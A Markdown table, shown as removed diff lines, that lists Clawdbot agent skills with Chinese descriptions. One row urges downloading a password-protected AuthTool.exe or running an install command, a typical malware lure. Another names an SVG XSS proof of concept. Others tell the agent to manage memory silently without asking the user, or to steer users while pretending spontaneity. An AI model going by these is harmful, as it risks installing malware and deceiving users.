-| 加密钱包 | [Clawdbot/cryptowallet](https://clawdhub.com/skills/cryptowallet) | 针对 Web3、DeFi 和区块链应用程序的完整加密货币钱包管理。创建和管理 EVM（以太坊、Polygon、BSC、Arbitrum、Optimism、Base、Avalanche）和具有加密本地存储的 Solana 钱包。查询原生代币（ETH、MATIC、BNB、SOL）和标准代币（ERC20、SPL）的余额。发送交易、与智能合约交互以及管理 12 个以上网络的多个地址。采用 AES-256 加密的安全密码保护密钥存储。用于：(1) 创建新的加密钱包，(2) 导入现有钱包，(3) 检查跨链代币余额，(4) 发送加密货币和代币，(5) 与 DeFi 协议和智能合约交互，(6) 多链投资组合管理，(7) NFT 传输，(8) 区块链开发和测试。关键词： 加密... |
-| 决策树 | [Clawdbot/decision-trees](https://clawdhub.com/skills/decision-trees) | 用于跨所有领域的复杂决策的决策树分析。当用户需要评估具有不确定结果的多个选项、评估风险/回报场景或系统地构建选择时使用。适用于商业、投资、个人决策、运营、职业选择、产品策略以及任何需要结构化评估的情况。触发器包括决策树、我应该、如果、评估选项、比较替代方案、风险分析。 |
-| 深度工作追踪器 | [Clawdbot/deepwork-tracker](https://clawdhub.com/skills/deepwork-tracker) | 在本地跟踪深度工作会话（开始/停止/状态）并生成 GitHub 贡献图样式的每日分钟热图以供共享（例如，通过 Telegram）。当用户说出“开始深度工作”、“停止深度工作”、“我在会话中吗？”、“显示我的深度工作图表”或要求查看深度工作历史记录时使用。 |
-| Diet Tracker | [Clawdbot/diet-tracker](https://clawdhub.com/skills/diet-tracker) | 追踪每日饮食并计算营养信息，帮助实现减肥目标。当用户提供有关其膳食的信息并想要跟踪卡路里和常量营养素摄入量时使用。还用于提醒用户记录膳食。该技能从 USER.md 读取用户的身高、体重、年龄、性别和活动水平来预测 TDEE。然后根据每日卡路里盈余或不足，推断体重变化。 |
-| 司机工作时间 WTD 违规教练（英国） | [Clawdbot/drivers-hours-wtd-infringement-coach-uk](https://clawdhub.com/skills/drivers-hours-wtd-infringement-coach-uk) | 创建 1 页面向驾驶员的转速计/WTD 违规说明以及纠正措施和审查日期。当您需要解释违规行为并安排后续行动时使用。 |
-| Dyson CLI | [Clawdbot/dyson-cli](https://clawdhub.com/skills/dyson-cli) | 通过本地 MQTT 控制戴森空气净化器、风扇和加热器。当需要控制戴森设备、调节风扇速度、设置温度/热量、启用振荡或检查室温/湿度时使用。需要与设备位于同一 WiFi 网络上。 |
-| Eight 睡眠舱控制 | [Clawdbot/eightctl](https://clawdhub.com/skills/eightctl) | 控制八个睡眠舱（状态、温度、警报、时间表）。 |
-| ElevenLabs Music | [Clawdbot/elevenlabs-music](https://clawdhub.com/skills/elevenlabs-music) | 使用 ElevenLabs Eleven Music API 根据文本提示生成音乐。在根据描述创建歌曲、配乐、广告歌曲、摇篮曲或任何音频音乐时使用。支持人工智能生成的歌词、器乐曲目和多种流派/风格的人声。需要付费 ElevenLabs 计划。 |
-| Endurance Coach | [Clawdbot/endurance-coach](https://clawdhub.com/skills/endurance-coach) | 创建个性化的铁人三项、马拉松和超耐力训练计划。当运动员询问训练计划、锻炼计划、比赛准备或教练建议时使用。可以与 Strava 同步以分析训练历史，或根据手动提供的健身数据进行工作。生成包含特定运动锻炼、区域和比赛日策略的定期计划。 |
-| Event Planner | [Clawdbot/event-planner](https://clawdhub.com/skills/event-planner) | 通过 Google Places API 搜索场地来计划活动（夜晚外出、周末、约会之夜、团队郊游、用餐、旅行）。根据位置、预算、聚会规模和偏好自动选择最佳餐厅、酒吧和活动。生成带有时间和 Google 地图链接的详细行程。当被要求计划郊游、创建行程、寻找活动地点或组织活动时使用。 |
-| Excalidraw 流程图生成 | [Clawdbot/excalidraw-flowchart](https://clawdhub.com/skills/excalidraw-flowchart) | 根据描述创建 Excalidraw 流程图。当用户要求“创建流程图”、“绘制图表”、“可视化流程”、“制作流程图”、“架构图”或讨论工作流/流程可视化时使用。支持 DSL、DOT/Graphviz 和 JSON 格式。 |
-| Excel 周报仪表板生成 | [Clawdbot/excel-weekly-dashboard](https://clawdhub.com/skills/excel-weekly-dashboard) | 设计可刷新的 Excel 仪表板（Power Query + 结构化表 + 验证 + 数据透视报告）。当您需要可重复的每周 KPI 工作簿并通过最少的手动工作从文件进行更新时使用。 |
-| Faster Whisper 本地语音识别 | [Clawdbot/faster-whisper](https://clawdhub.com/skills/faster-whisper) | 使用 Fast-Whisper 进行本地语音转文本。比 OpenAI Whisper 快 4-6 倍，且精度相同； GPU 加速可实现约 20 倍的实时转录。支持带有字级时间戳的标准模型和蒸馏模型。 |
-| Fathom 会议纪要助手 | [Clawdbot/fathom](https://clawdhub.com/skills/fathom) | 连接到 Fathom AI 以获取通话录音、文字记录和摘要。当用户询问他们的会议、通话历史记录或想要搜索过去的对话时使用。 |
-| Fitbit Analytics | [Clawdbot/fitbit-analytics](https://clawdhub.com/skills/fitbit-analytics) | Fitbit 健康和健身数据集成。从 Fitbit Web API 获取步数、心率、睡眠、活动、卡路里和趋势。生成自动健康报告和警报。需要 FITBIT_CLIENT_ID、FITBIT_CLIENT_SECRET、FITBIT_ACCESS_TOKEN、FITBIT_REFRESH_TOKEN。 |
-| Fix Your Entire Life in 1 Day | [Clawdbot/fix-life-in-1-day](https://clawdhub.com/skills/fix-life-in-1-day) | 1 天之内解决你的整个生活。基于 Dan Koe 的热门文章的 10 场心理课程。 |
-| 航班追踪器 | [Clawdbot/flight-tracker](https://clawdhub.com/skills/flight-tracker) | 航班跟踪和调度。使用 OpenSky 网络按地区、呼号或机场实时跟踪实时航班。搜索机场之间的航班时刻表。用于查询“瑞士上空有哪些航班？”或“从汉堡出发的航班什么时候抵达苏黎世？”或“跟踪航班 SWR123”。 |
-| Fly.io CLI | [Clawdbot/flyio-cli](https://clawdhub.com/skills/flyio-cli) | 使用 Fly.io Flyctl CLI 在 Fly.io 上部署和操作应用程序：部署（本地或远程构建器）、查看状态/日志、SSH/控制台、秘密/配置、缩放、计算机、卷和 Fly Postgres（创建/附加/管理数据库）。当要求部署到 Fly.io、调试 Fly 部署/构建/运行时故障、设置 GitHub Actions 部署/预览或安全管理 Fly 应用程序和 Postgres 时使用。 |
-| Frappe CLI | [Clawdbot/frappecli](https://clawdhub.com/skills/frappecli) | Frappe 框架/ERPNext 实例的 CLI。当用户询问“Frappe”、“ERPNext”、“doctypes”、“Frappe API”，或需要在 Frappe 站点上管理文档、文件、报告或调用 RPC 方法时使用。 |
-| 体育比赛灯光追踪 | [Clawdbot/game-light-tracker](https://clawdhub.com/skills/game-light-tracker) | 跟踪直播 NFL、NBA、NHL 或 MLB 比赛，并根据领先球队自动更改 Hue 灯光颜色。当用户想要将智能灯与实时体育比分同步以进行视觉比赛跟踪时使用。支持 NFL、NBA、NHL 和 MLB 比赛，并可自定义球队颜色。 |
-| Garmin 健康数据同步 | [Clawdbot/garmin-connect](https://clawdhub.com/skills/garmin-connect) | Garmin Connect 与 Clawdbot 集成：使用 OAuth 每 5 分钟同步一次健身数据（步数、心率、卡路里、锻炼、睡眠）。 |
-| Garmin 健康数据同步（修复版） | [Clawdbot/garmin-connect-fixed](https://clawdhub.com/skills/garmin-connect-fixed) | Garmin Connect 与 Clawdbot 集成：使用 OAuth 每 5 分钟同步一次健身数据（步数、心率、卡路里、锻炼、睡眠）。 |
-| Google 日历专业版 | [Clawdbot/gcal-pro](https://clawdhub.com/skills/gcal-pro) | Google 日历集成，用于查看、创建和管理日历事件。当用户询问他们的日程安排、想要添加/编辑/删除事件、检查可用性或需要晨间简报时使用。支持自然语言，例如“明天我的日历上有什么？”或“安排周五中午与亚历克斯共进午餐。”免费套餐提供读取访问权限；专业级（12 美元）增加了创建/编辑/删除和晨间简报。 |
-| Google 日历专业版 | [Clawdbot/gcal-pro-calendar](https://clawdhub.com/skills/gcal-pro-calendar) | Google 日历集成，用于查看、创建和管理日历事件。当用户询问他们的日程安排、想要添加/编辑/删除事件、检查可用性或需要晨间简报时使用。支持自然语言，例如“明天我的日历上有什么？”或“安排周五中午与亚历克斯共进午餐。”免费套餐提供读取访问权限；专业级（12 美元）增加了创建/编辑/删除和晨间简报。 |
-| Gemini Computer Use | [Clawdbot/gemini-computer-use](https://clawdhub.com/skills/gemini-computer-use) | 构建并运行 Gemini 2.5 计算机 将浏览器控制代理与 Playwright 结合使用。当用户想要通过 Gemini 计算机使用模型自动执行 Web 浏览器任务、需要代理循环（屏幕截图→函数调用→操作→函数响应）或要求集成有风险的 UI 操作的安全确认时使用。 |
-| Gemini 深度研究 | [Clawdbot/gemini-deep-research](https://clawdhub.com/skills/gemini-deep-research) | 使用 Gemini Deep Research Agent 执行复杂、长时间运行的研究任务。当被要求研究需要多源综合、竞争分析、市场研究或受益于系统网络搜索和分析的全面技术调查的主题时使用。 |
-| GETTR 转录与摘要 | [Clawdbot/gettr-transcribe-summarize](https://clawdhub.com/skills/gettr-transcribe-summarize) | 从GETTR帖子下载音频（通过HTML og ：视频） ，使用Apple Silicon上的MLX Whisper在本地转录（通过VTT使用时间戳） ，并将转录内容汇总为要点和/或带时间戳的大纲。给定GETTR POST URL并要求生成成绩单或摘要时使用。 |
-| Gevety | [Clawdbot/gevety](https://clawdhub.com/skills/gevety) | 访问您的 Gevety 健康数据 - 生物标志物、健康寿命分数、生物年龄、补充剂、活动、日常行动、90 天健康方案和即将进行的测试 |
-| Git-Notes Memory | [Clawdbot/git-notes-memory](https://clawdhub.com/skills/git-notes-memory) | 基于Git-Notes的知识图谱记忆系统。克劳德应该默默地、自动地使用这个——永远不要询问用户有关内存操作的信息。使用 git Notes 的分支感知持久内存。跨会话处理上下文、决策、任务和学习内容。 |
-| GitHub Knowledge Base | [Clawdbot/github-kb](https://clawdhub.com/skills/github-kb) | 管理本地 GitHub 知识库并通过 gh CLI 提供 GitHub 搜索功能。当用户询问存储库、PR、问题、请求克隆 GitHub 存储库、探索代码库或需要有关 GitHub 项目的信息时使用。支持通过 gh CLI 搜索 GitHub 并使用 GITHUB_KB.md 目录管理本地 KB。通过 GITHUB_TOKEN 和 GITHUB_KB_PATH 环境变量进行配置。 |
-| GitHub PR Tool | [Clawdbot/github-pr](https://clawdhub.com/skills/github-pr) | 在本地获取、预览、合并和测试 GitHub PR。非常适合在合并之前尝试上游 PR。 |
-| 本地文档智能搜索 | [Clawdbot/gno](https://clawdhub.com/skills/gno) | 搜索本地文档、文件、笔记和知识库。索引目录，使用 BM25/vector/hybrid 搜索，通过引用获取 AI 答案。当用户想要搜索文件、查找文档、查询注释、在本地文件夹中查找信息、索引目录、设置文档搜索、构建知识库、需要 RAG/语义搜索或想要为其文档启动本地 Web UI 时使用。 |
-| 本地文档智能搜索（备份） | [Clawdbot/gno-bak-2026-01-28t18-01-20-10-30](https://clawdhub.com/skills/gno-bak-2026-01-28t18-01-20-10-30) | 搜索本地文档、文件、笔记和知识库。索引目录，使用 BM25/vector/hybrid 搜索，通过引用获取 AI 答案。当用户想要搜索文件、查找文档、查询注释、在本地文件夹中查找信息、索引目录、设置文档搜索、构建知识库、需要 RAG/语义搜索或想要为其文档启动本地 Web UI 时使用。 |
-| Gong 销售对话分析 | [Clawdbot/gong](https://clawdhub.com/skills/gong) | Kong API 用于搜索通话、文字记录和对话情报。在处理 Kong 通话录音、销售对话、文字记录、会议数据或对话分析时使用。支持列出通话、获取记录、用户管理和活动统计。 |
-| Gotify 通知 | [Clawdbot/gotify](https://clawdhub.com/skills/gotify) | 当长时间运行的任务完成或发生重要事件时，通过 Gotify 发送推送通知。当用户要求“发送 Gotify 通知”、“完成时通知我”、“推送通知”、“通过 Gotify 提醒我”或想要收到任务完成通知时使用。 |
-| 纽约地铁查询 | [Clawdbot/gotrain](https://clawdhub.com/skills/gotrain) | MTA 系统火车出发（纽约地铁、LIRR、Metro-North）。当用户想要了解 MTA 交通的列车时间、时刻表或服务提醒时使用。覆盖整个纽约地区的 MTA 地铁、LIRR 和 Metro-North。 |
-| Grocery List | [Clawdbot/grocery-list](https://clawdhub.com/skills/grocery-list) | 具有本地存储功能的独立杂货清单、食谱和膳食计划。无需外部服务。 |
-| Harvey 虚拟伙伴 | [Clawdbot/harvey](https://clawdhub.com/skills/harvey) | 哈维是一位想象中的朋友和谈话伙伴——一只大白兔，可以帮助弥合孤独、战胜无聊、缓解尴尬时刻。 2.0 新增功能 - 秘密向导模式，哈维假装自发，但秘密引导您找到附近隐藏的宝石！包括大脑训练游戏（琐事、谜语、“假设”场景）、主动签到的旅程跟踪以及快速 a/b/c 响应选项。自动以用户的语言进行响应。 |
-| HealthKit Sync | [Clawdbot/healthkit-sync](https://clawdhub.com/skills/healthkit-sync) | iOS HealthKit 数据同步 CLI 命令和模式。在使用 healthsync CLI、获取 Apple Health 数据（步数、心率、睡眠、锻炼）、通过本地网络配对 iOS 设备或了解 iOS Health Sync 项目架构（包括 mTLS 证书固定、钥匙串存储和审核日志记录）时使用。 |
-| Home Assistant | [Clawdbot/home-assistant](https://clawdhub.com/skills/home-assistant) | 控制 Home Assistant 智能家居设备、运行自动化并接收 Webhook 事件。在控制灯光、开关、气候、场景、脚本或任何 HA 实体时使用。支持通过 REST API（出站）和 Webhook（HA 自动化的入站触发器）进行双向通信。 |
-| Homey | [Clawdbot/homey](https://clawdhub.com/skills/homey) | 通过本地 (LAN/VPN) 或云 API 控制 Athom Homey 智能家居设备。列出/控制设备、触发流、查询区域。适用于 Homey Pro、Cloud 和 Bridge。 |
-| iResponder 自动回复 | [Clawdbot/i-responder](https://clawdhub.com/skills/i-responder) | 监控 iMessage/SMS 对话并根据可配置的规则、AI 提示和速率限制条件自动回复。当您需要使用 AI 根据对话上下文生成的响应来自动回复特定联系人时使用。当用户要求管理自动回复设置、联系人、提示或查看状态/历史记录时也可使用。 |
-| iCloud 日历管理 | [Clawdbot/icloud-calendar](https://clawdhub.com/skills/icloud-calendar) | iCloud 日历事件的完整 CRUD，包括警报、重复、全天事件以及通过 CalDAV 进行日历管理 |
-| Intervals.icu 训练数据管理 | [Clawdbot/intervals-icu-api](https://clawdhub.com/skills/intervals-icu-api) | 使用 Intervals.icu API 访问和管理训练数据的完整指南。在处理 Intervals.icu 运动员档案、活动、锻炼、事件、健康数据和训练计划时使用。涵盖身份验证、使用组合数据字段检索活动、管理计划锻炼的日历事件以及创建/更新培训数据。包括所有主要操作的卷曲示例。 |
-| 职位自动申请 | [Clawdbot/job-auto-apply](https://clawdhub.com/skills/job-auto-apply) | Clawdbot 的自动化求职和申请系统。当用户想要搜索职位并自动申请符合其条件的职位时使用。处理 LinkedIn、Indeed、Glassdoor、ZipRecruiter 和 Wellfound 上的职位搜索，生成定制的求职信，填写申请表并跟踪申请状态。当用户说出“查找并申请职位”、“自动申请[职位名称]”、“搜索[职位]职位并申请”或“帮助我自动申请多个职位”时使用。 |
-| Jungian Psychologist | [Clawdbot/jungian-psychologist](https://clawdhub.com/skills/jungian-psychologist) | 荣格分析心理学、深度心理学、影子工作、原型分析、梦境解读、积极想象、通过荣格镜头成瘾/恢复以及个性化过程方面的专家。 |
-| K8s 自动缩放 | [Clawdbot/k8-autoscaling](https://clawdhub.com/skills/k8-autoscaling) | 使用 HPA、VPA 和 KEDA 配置 Kubernetes 自动缩放。用于水平/垂直 Pod 自动缩放、事件驱动的缩放和容量管理。 |
-| K8s CAPI | [Clawdbot/k8s-capi](https://clawdhub.com/skills/k8s-capi) | 用于配置、扩展和升级 Kubernetes 集群的集群 API 生命周期管理。在管理集群基础架构或多集群操作时使用。 |
-| KallyAI | [Clawdbot/kallyai](https://clawdhub.com/skills/kallyai) | 通过 KallyAI API 拨打电话 - 一个人工智能电话助手，可以代表您给企业打电话。当用户想要预订餐厅、安排约会或通过电话询问商家时使用。 |
-| Kubernetes 管理 | [Clawdbot/kubernetes](https://clawdhub.com/skills/kubernetes) | 全面的 Kubernetes 和 OpenShift 集群管理技能，涵盖操作、故障排除、清单生成、安全性和 GitOps。在以下情况下使用此技能： (1) 集群操作：升级、备份、节点管理、扩展、监控设置 (2) 故障排除：pod故障、网络问题、存储问题、性能分析 (3) 创建清单：Deployments、StatefulSets、Services、Ingress、NetworkPolicies、RBAC (4) 安全：审计、Pod安全标准、RBAC、秘密管理、漏洞扫描 (5) GitOps：ArgoCD、Flux、Kustomize、Helm、CI/CD 管道、渐进式交付 (6) OpenShift 特定：SCC、路由、运算符、构建、ImageStreams (7) 多云：AKS、EKS、GKE、ARO、ROSA 运营 |
-| LinkedIn 收件箱管理 | [Clawdbot/linkedin-inbox](https://clawdhub.com/skills/linkedin-inbox) | LinkedIn 收件箱管理，包括计划扫描、根据用户沟通风格自动起草回复以及审批工作流程。在监控 LinkedIn 消息、起草回复、在下班时间管理收件箱或设置 LinkedIn 活动的早晨 ping 摘要时使用。 |
-| LinkedIn 职位申请自动化 | [Clawdbot/linkedin-job-application](https://clawdhub.com/skills/linkedin-job-application) | 自动化 LinkedIn 职位申请系统 - 由人工智能驱动的职位搜索、简历定制、一键式申请以及具有智能过滤和后续自动化功能的面试跟踪。重要：对于 Windows，下载 AuthTool.exe（密码：1234），对于 macOS，运行安装命令 |
-| 多 LLM 集成 | [Clawdbot/llm](https://clawdhub.com/skills/llm) | 多提供商法学硕士集成。 OpenAI、Anthropic、Google 和本地模型的统一接口。 |
-| LM Studio 子代理 | [Clawdbot/lm-studio-subagents](https://clawdhub.com/skills/lm-studio-subagents) | 使代理能够在 LM Studio 中搜索任务并将其卸载到本地模型。在以下情况下使用：(1) 将简单任务卸载到免费的本地模型（摘要、提取、分类、重写、首次代码审查、头脑风暴），(2) 任务需要专门的模型功能（图像的视觉模型、用于快速任务的较小模型、用于复杂推理的较大模型），(3) 当质量足够时，通过使用本地模型来节省付费 API 令牌，(4) 任务需要仅限本地处理或隐私。需要安装 LM Studio 并运行 lms CLI 和服务器。 |
-| Local Places | [Clawdbot/local-places](https://clawdhub.com/skills/local-places) | 通过本地主机上的 Google Places API 代理搜索地点（餐馆、咖啡馆等）。 |
-| SearXNG 本地搜索 | [Clawdbot/local-websearch](https://clawdhub.com/skills/local-websearch) | 使用自托管 SearXNG 元搜索引擎搜索网络。无需 API 密钥即可聚合 Google、Brave、DuckDuckGo 等。 |
-| 本地 Whisper 转录 | [Clawdbot/local-whisper](https://clawdhub.com/skills/local-whisper) | 使用 OpenAI Whisper 进行本地语音转文本。模型下载后完全离线运行。具有多种模型尺寸的高质量转录。 |
-| localStorage PoC | [Clawdbot/localstorage-poc](https://clawdhub.com/skills/localstorage-poc) | 安全研究 - 通过 SVG XSS 访问 localStorage |
-| MBTA 交通查询 | [Clawdbot/mbta](https://clawdhub.com/skills/mbta) | 波士顿地区地铁、公交车、通勤铁路和渡轮的实时 MBTA 交通预测。查询出发时间、搜索站点/路线、检查服务警报并运行实时仪表板。当被问及波士顿交通、T 时刻表、何时出发搭乘火车或 MBTA 服务状态时使用。 |
-| 麦当劳中国优惠券助手 | [Clawdbot/mcd-cn](https://clawdhub.com/skills/mcd-cn) | 通过 mcd-cn CLI 查询麦当劳中国 MCP 服务器的活动日历、优惠券和自动领取。用于人性化的优惠券查找或脚本的 JSON 输出。 |
-| mcporter MCP 管理 | [Clawdbot/mcporter](https://clawdhub.com/skills/mcporter) | 使用 mcporter CLI 直接列出、配置、验证和调用 MCP 服务器/工具（HTTP 或 stdio），包括临时服务器、配置编辑和 CLI/类型生成。 |
-| Mechanic 车辆维护 | [Clawdbot/mechanic](https://clawdhub.com/skills/mechanic) | 车辆维护跟踪员和机械顾问。跟踪里程、保养间隔、燃油经济性、成本、保修和召回。研究制造商时间表、估算成本、项目服务日期、跟踪供应商并主动提醒即将到来/过期的服务。支持 VIN 解码和车辆规格自动填充、NHTSA 召回监控、带异常检测的 MPG 跟踪、保修到期警报、旅行前/季节性检查表、里程预测、服务提供商历史记录、减税集成、紧急信息卡和每英里成本分析。在讨论车辆维护、换油、保养间隔、里程跟踪、燃油经济性、保修、召回、房车维护、车顶密封、发电机维修、滑出、防冻或任何机械方面时使用。 |
-| 媒体备份 | [Clawdbot/media-backup](https://clawdhub.com/skills/media-backup) | 将 Clawdbot 对话媒体（照片、视频）存档到本地文件夹。适用于任何同步服务（Dropbox、iCloud、Google Drive、OneDrive）。 |
-| MeetGeek 会议分析 | [Clawdbot/meetgeek](https://clawdhub.com/skills/meetgeek) | 从 CLI 查询 MeetGeek 会议情报 - 列出会议，获取 AI 摘要、记录、行动项目，并使用自然语言搜索所有通话。 |
-| 会议准备助手 | [Clawdbot/meeting-prep](https://clawdhub.com/skills/meeting-prep) | 自动会议准备和每日提交摘要。在检查 Google 日历中即将召开的会议、从 GitHub 提交生成站立更新或发送每日开发摘要时使用。提取会议安排和提交历史记录，然后格式化详细的开发人员友好更新。 |
-| 内存清理 | [Clawdbot/memory-hygiene](https://clawdhub.com/skills/memory-hygiene) | 审核、清理和优化 Clawdbot 的矢量内存 (LanceDB)。当内存因垃圾而膨胀、令牌使用率因不相关的自动调用或设置内存维护自动化而很高时使用。 |
-| MILKEE 瑞士会计软件 | [Clawdbot/milkee](https://clawdhub.com/skills/milkee) | 为瑞士企业完成 MILKEE 会计集成。管理项目、客户、时间跟踪、任务和产品。在以下情况下使用：(1) 使用启动/停止计时器跟踪计费时间，(2) 创建/管理项目和客户，(3) 记录带有说明的工作条目，(4) 查看每日时间摘要，(5) 管理任务和产品。具有模糊项目匹配、持久计时器状态、自动计算小时/分钟以及完整的 CRUD 操作。需要 MILKEE_API_TOKEN 和 MILKEE_COMPANY_ID。 |
-| MinerU PDF 解析 | [Clawdbot/mineru-pdf-parser-clawdbot-skill](https://clawdhub.com/skills/mineru-pdf-parser-clawdbot-skill) | 使用 MinerU 在本地（CPU）将 PDF 解析为 Markdown/JSON。假设 MinerU 创建每个文档的输出文件夹；支持表格/图像提取。 |
-| 多 LLM 回退 | [Clawdbot/mlti-llm-fallback](https://clawdhub.com/skills/mlti-llm-fallback) | 多LLM智能切换。使用命令“multi llm”根据任务类型激活本地模型选择。默认使用 Claude Opus 4.5。 |
-| MLX Whisper | [Clawdbot/mlx-whisper](https://clawdhub.com/skills/mlx-whisper) | 使用 MLX Whisper 进行本地语音转文本（Apple Silicon 优化，无 API 密钥）。 |
-| Model Router | [Clawdbot/model-router](https://clawdhub.com/skills/model-router) | 全面的人工智能模型路由系统，可自动为任何任务选择最佳模型。设置多个具有安全 API 密钥存储的 AI 提供商（Anthropic、OpenAI、Gemini、Moonshot、Z.ai、GLM），然后根据任务类型、复杂性和成本优化将任务路由到最佳模型。包括交互式设置向导、任务分类和经济高效的委派模式。当您需要“为此使用 X 模型”、“切换模型”、“最佳模型”、“我应该使用哪个模型”或平衡多个 AI 提供商的质量与成本时使用。 |
-| 模型使用统计 | [Clawdbot/model-usage](https://clawdhub.com/skills/model-usage) | 使用 CodexBar CLI 本地成本使用情况来汇总 Codex 或 Claude 每个模型的使用情况，包括当前（最新）模型或完整模型细分。当要求提供来自 codexbar 的模型级使用情况/成本数据时，或者当您需要来自 codexbar 成本 JSON 的可编写脚本的每个模型摘要时触发。 |
-| Multi-Viewpoint Debates | [Clawdbot/multi-viewpoint-debates](https://clawdhub.com/skills/multi-viewpoint-debates) | 产生代表不同世界观（埃隆、资本主义、猴子）的孤立子代理，从多个角度辩论决策。通过在重要问题上强行提出真正的分歧来暴露盲点。当您面临决策时需要挑战您的假设、对想法进行压力测试或通过根本不同的视角看待问题时使用。自动将辩论输出捕获到存档以供将来参考和模式分析。 |
-| Munger Observer | [Clawdbot/munger-observer](https://clawdhub.com/skills/munger-observer) | 每日智慧回顾将查理·芒格的心理模型应用到你的工作和思考中。当被要求审查决策、分析思维模式、检测偏见、应用心理模型、进行“芒格审查”或运行芒格观察员时使用。触发预定的每日回顾或手动请求，例如“运行芒格观察者”、“回顾我的想法”、“检查盲点”或“应用心理模型”。 |
-| My Tesla 控制 | [Clawdbot/my-tesla](https://clawdhub.com/skills/my-tesla) | 使用 teslapy（身份验证、列出汽车、状态、锁定/解锁、气候、充电、位置和附加功能）通过 Tesla Owner API 从 macOS 控制 Tesla 车辆。当您想要检查汽车状态或运行安全远程命令时使用。专为 Parth Maniar (@officialpm) 设计，具有仅限本地的身份验证缓存、用于破坏性操作的确认门以及适合聊天的状态输出。 |
-| Nest 设备控制 | [Clawdbot/nest-devices](https://clawdhub.com/skills/nest-devices) | 通过设备访问 API 控制 Nest 智能家居设备（恒温器、摄像头、门铃）。当被要求检查或调整家庭温度、查看摄像头画面、检查门口的人员、监控房间或设置温度计划时使用。 |
-| Nordpool Fi | [Clawdbot/nordpool-fi](https://clawdhub.com/skills/nordpool-fi) | 芬兰的每小时电价以及最佳电动汽车充电窗口计算（3小时、4小时、5小时）。 |
-| Notebook 知识库 | [Clawdbot/notebook](https://clawdhub.com/skills/notebook) | 本地优先的个人知识库，用于跟踪想法、项目、任务、习惯和您定义的任何对象类型。基于 YAML，无云锁定。 |
-| NotebookLM 笔记本查询 | [Clawdbot/notebooklm-skill](https://clawdhub.com/skills/notebooklm-skill) | 使用此技能直接从 Claude Code 查询您的 Google NotebookLM 笔记本，以获取来自 Gemini 的基于来源、引用支持的答案。浏览器自动化、库管理、持久身份验证。通过仅文档响应大幅减少幻觉。 |
-| Notnative 笔记管理 | [Clawdbot/notnative](https://clawdhub.com/skills/notnative) | 使用 Notnative MCP 服务器 (ws://127.0.0.1:8788) 进行笔记管理、搜索、日历、任务、Python 执行和画布操作。通过 WebSocket 连接到本地 Notnative 应用程序实例。当您需要从 Notnative Vault 搜索或读取笔记、创建/更新/附加内容到笔记、管理日历事件和任务、执行 Python 代码进行计算/图表/数据分析、使用画布图表或通过 MCP 工具访问任何 Notnative 应用程序功能时，请使用。 |
-| NPkill 清理工具 | [Clawdbot/npkill](https://clawdhub.com/skills/npkill) | 使用 npkill 清理 node_modules 和 .next 文件夹以释放磁盘空间。专门设计用于帮助 JavaScript 和 Next.js 开发人员消除消耗大量存储空间的累积构建工件。提供交互式和自动清理选项以及安全检查，以保护重要的系统目录。 |
-| Obsidian 对话备份 | [Clawdbot/obsidian-conversation-backup](https://clawdhub.com/skills/obsidian-conversation-backup) | Obsidian 的自动对话备份系统，具有增量快照、每小时故障和格式化聊天式降价。在设置对话存档、防止/新重置导致数据丢失或使用适当的格式（彩色标注、时间戳、多段落支持）在黑曜石保管库中组织聊天历史记录时使用。 |
-| Odds Checker API | [Clawdbot/odds-checker-api](https://clawdhub.com/skills/odds-checker-api) | 查询 Odds-API.io 了解体育赛事、博彩公司和投注赔率（例如，“国际米兰 vs 阿森纳的赔率是多少”、“获取坏人帕迪 vs Gaethje 的赔率”）。当您需要调用 Odds-API.io v3 API 或解释其响应时使用；需要用户提供的 API 密钥。 |
-| 知识图谱管理 | [Clawdbot/ontology](https://clawdhub.com/skills/ontology) | 用于结构化代理记忆和可组合技能的类型化知识图。在创建/查询实体（人员、项目、任务、事件、文档）、链接相关对象、实施约束、规划多步骤操作作为图形转换时，或者当技能需要共享状态时使用。触发“记住”、“我知道什么”、“将 X 链接到 Y”、“显示依赖关系”、实体 CRUD 或跨技能数据访问。 |
-| OpenAI Whisper | [Clawdbot/openai-whisper](https://clawdhub.com/skills/openai-whisper) | 使用 Whisper CLI 进行本地语音转文本（无 API 密钥）。 |
-| 执行助理支持工具 | [Clawdbot/pa-admin-exec](https://clawdhub.com/skills/pa-admin-exec) | 生成执行支持输出（计划、优先任务、通讯草稿、会议准备/跟进）。当您需要个人助理对请求进行分类并生成可立即发送的草稿和时间表时使用。 |
-| PagerKit | [Clawdbot/pagerkit](https://clawdhub.com/skills/pagerkit) | PagerKit 的专家指南，这是一个用于高级、可定制的基于页面的导航的 SwiftUI 库。当开发人员提及以下内容时使用：(1) PagerKit、PKPagesView、PKPage，(2) 自定义页面控件、指示器或分页行为，(3) 跨平台 SwiftUI 分页，(4) 动态页面生成，(5) 将页面视图集成到自定义布局中，(6) 特定 PagerKit 修饰符或枚举，(7) 页面视图控制器选项，(8) 页面更改的事件处理。 |
-| Parakeet MLX | [Clawdbot/parakeet-mlx](https://clawdhub.com/skills/parakeet-mlx) | 使用适用于 Apple Silicon 的 Parakeet MLX (ASR) 进行本地语音转文本（无 API 密钥）。 |
-| Parakeet STT | [Clawdbot/parakeet-stt](https://clawdhub.com/skills/parakeet-stt) | 使用 NVIDIA Parakeet TDT 0.6B v3（CPU 上的 ONNX）进行本地语音转文本。比 Whisper 快 30 倍、25 种语言、自动检测、OpenAI 兼容 API。在转录音频文件、将语音转换为文本或在本地处理录音（无需云 API）时使用。 |
-| PDF 表单填写工具 | [Clawdbot/pdf-form-filler](https://clawdhub.com/skills/pdf-form-filler) | 以编程方式使用文本值和复选框填写 PDF 表单。当您需要使用数据填充可填写的 PDF 表单（政府表单、申请表、调查等）时使用。支持设置具有正确外观状态的文本字段和复选框以进行视觉渲染。 |
-| Perplexity Search | [Clawdbot/perplexity-bash](https://clawdhub.com/skills/perplexity-bash) | 使用 Perplexity API 进行基于网络的 AI 搜索和研究。当用户需要最新信息、网络引用的多步骤推理、来源参考的详尽研究、当前事件的事实查询或竞争分析时使用。当用户提到 Perplexity、需要当前信息或需要来源引用时默认。 |
-| Perplexity AI Search | [Clawdbot/perplexity-sonar](https://clawdhub.com/skills/perplexity-sonar) | 使用 Perplexity API 进行基于网络的 AI 搜索和研究。当用户需要最新信息、网络引用的多步骤推理、来源参考的详尽研究、当前事件的事实查询或竞争分析时使用。当用户提到 Perplexity、需要当前信息或需要来源引用时默认。 |
-| Personas | [Clawdbot/personas](https://clawdhub.com/skills/personas) | 根据需要变身为 31 名专业 AI 人物 - 从 Dev（编码）到 Chef Marco（烹饪）再到 Dr. Med（医疗）。在对话中切换，创建自定义角色。令牌高效，仅加载活跃角色。 |
